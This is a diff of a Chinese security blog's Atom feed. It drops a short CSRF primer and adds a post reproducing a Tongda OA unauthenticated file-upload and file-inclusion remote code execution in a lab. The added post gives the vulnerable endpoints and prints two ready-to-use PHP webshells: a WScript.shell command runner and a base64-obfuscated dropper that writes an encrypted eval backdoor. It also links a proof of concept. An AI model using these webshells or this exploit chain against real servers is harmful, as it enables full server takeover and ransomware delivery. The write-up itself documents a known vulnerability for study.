@@ -193,30 +193,6 @@
   </entry>
   
   <entry>
-    <title>CSRF从0到1</title>
-    <link href="http://lvpsectime.github.io/post/65258.html"/>
-    <id>http://lvpsectime.github.io/post/65258.html</id>
-    <published>2020-05-22T07:07:47.000Z</published>
-    <updated>2020-07-09T00:03:03.927Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。与 XSS 不同的是，XSS利用站点内的信任用户，而CSRF通过伪装成受信任用户请求受信任的网站，也就是攻击者盗用你的身份，以你的名义发送恶意请求。</p><p>CSRF能够做的事情包括以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账等。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>举个例子</strong></p><p>你想给某用户转账100元，单击“转账”按钮之后，发出的HTTP请求会与<code>http://www.xxbank.com/pay.php?user=xx&amp;money=100</code>类似。攻击者构造链接<code>http://www.xxbank.com/pay.php?user=hacker&amp;money=100</code>，当目标用户访问了该URL后，就会自动向hacker账号转账100元，而且这只涉及目标用户的操作，攻击者并没有获取目标用户的cookie或其他信息。</p><p>CSRF攻击过程有两个重点：</p><ul><li>目标用户已经登录了网站，能够执行网站的功能</li><li>目标用户访问了攻击者构造的URL</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session</summary>
-      
-    
-    
-    
-    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
-    
-    
-    <category term="WEB" scheme="http://lvpsectime.github.io/tags/WEB/"/>
-    
-  </entry>
-  
-  <entry>
     <title>chisel使用</title>
     <link href="http://lvpsectime.github.io/post/13593.html"/>
     <id>http://lvpsectime.github.io/post/13593.html</id>
@@ -477,6 +453,32 @@
     
     
     <category term="shell" scheme="http://lvpsectime.github.io/tags/shell/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>通达OA任意文件上传+文件包含导致RCE漏洞复现</title>
+    <link href="http://lvpsectime.github.io/post/38272.html"/>
+    <id>http://lvpsectime.github.io/post/38272.html</id>
+    <published>2020-04-26T09:39:04.000Z</published>
+    <updated>2020-04-28T01:54:24.524Z</updated>
+    
+    <content type="html"><![CDATA[<img src="/post/38272/home.png" alt="home" style="zoom:80%;"><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等。</p><p>该漏洞被黑产利用，用于投放勒索病毒</p><p>该漏洞在绕过身份验证的情况下通过文件上传漏洞上传恶意php文件，组合文件包含漏洞最终造成远程代码执行漏洞，从而导致可以控制服务器system权限。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">V11版</span><br><span class="line">2017版</span><br><span class="line">2016版</span><br><span class="line">2015版</span><br><span class="line">2013增强版</span><br><span class="line">2013版</span><br></pre></td></tr></table></figure><h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h2><p><strong>无需身份认证</strong></p><ol><li>任意文件上传 <code>/ispirit/im/upload.php</code></li><li>本地文件包含 <code>ispirit/interface/gateway.php</code></li></ol><p><strong>命令执行绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;exec(<span class="string">&quot;cmd /c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>GetWebshell</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&#x27;readme.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = base64_decode(<span class="string">&quot;PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$a</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>php Zend 解码</strong></p><p><a href="http://dezend.qiling.org/free.html">http://dezend.qiling.org/free.html</a></p><h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><p>被授权的远程攻击者通过文件上传配合文件包含，触发远程恶意代码执行。系统中<code>auth.php</code>是登陆验证的相关逻辑，<code>upload.php</code>中$P参数如果非空就不需要经过<code>auth.php</code>验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。攻击者可通过精心构造<code>json</code>进入<code>includ_once</code>进行文件包含。</p><h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h2><p>本次实验所用版本是<code>通达V11.3</code></p><p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p><p>提取码：z863</p><p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p><p>本机IP：<code>192.168.150.142</code></p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>这里需要注意的是：有些版本的<code>gateway.php</code>路径不同。</p><p>2013</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br></pre></td></tr></table></figure><p>2017</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/mac/gateway.php</span><br></pre></td></tr></table></figure><p>V11</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>任意文件上传漏洞路径<code>/ispirit/im/upload.php</code></p><p><img src="/post/38272/upload.png" alt="upload"></p><p>使用burp抓包，构造请求包，发送数据包可以看到成功上传</p><p><img src="/post/38272/request.png" alt="request"></p><p>filename = <code>2004/1795480914.jpg</code></p><p>由于上传目录不在根目录所以还是需要另一个漏洞来进行文件包含。</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>本地文件包含漏洞路径 <code>/ispirit/interface/gateway.php</code></p><p><img src="/post/38272/include.png" alt="include"></p><p>成功包含上面上传文件，并执行命令。</p><h2 id="0x06-最后"><a href="#0x06-最后" class="headerlink" title="0x06 最后"></a>0x06 最后</h2><p>这个漏洞复现花了很长时间，一开始不知道怎么构造数据包。</p><p>通达OA开启了 <code>disable_funcation</code> 功能 很多常见的命令执行函数如 <code>exec</code>、<code>eval</code>、<code>system</code>等都被禁止了，需要bypass。这个我还不会，后面会找时间学习学习。</p><h2 id="0x07参考"><a href="#0x07参考" class="headerlink" title="0x07参考"></a>0x07参考</h2><p><a href="http://blog.fuzz.pub/2020/03/17/%E9%80%9A%E8%BE%BEoa%20RCE%20%E5%88%86%E6%9E%90/">通达OA RCE分析</a></p><p><a href="https://github.com/jas502n/OA-tongda-RCE">POC</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10944118.html">bypass disable_funcation</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;img src=&quot;/post/38272/home.png&quot; alt=&quot;home&quot; style=&quot;zoom:80%;&quot;&gt;
+
+&lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;&gt;</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="http://lvpsectime.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
   </entry>
   
